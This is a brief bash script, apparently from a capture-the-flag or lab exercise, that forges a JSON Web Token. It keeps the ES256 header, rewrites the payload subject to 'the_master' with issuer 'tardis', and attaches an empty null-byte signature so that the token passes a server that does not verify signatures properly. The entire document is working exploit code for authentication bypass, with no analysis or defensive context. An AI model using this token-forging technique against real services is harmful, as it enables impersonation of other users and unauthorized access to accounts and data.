#!/bin/bash

jwt=$(
     # Unchanged header
    echo -n '{"alg":"ES256","typ":"JWT"}' | base64 -w 0
    echo -n '.'
    # Change the subject in the payload
    echo -n '{"sub":"the_master","iss":"tardis","nbf":1678474800,"exp":1678647600,"iat":'$(date +%s)'}' | base64 -w 0
    echo -n '.'
    # Create an empty signature of the expected length
    echo -ne '\0\0\0\0' | base64 -w 0
)

# Lastly, echo it but also remove any equal signs as these are not allowed in a JWT
echo $jwt | sed 's/=//g'
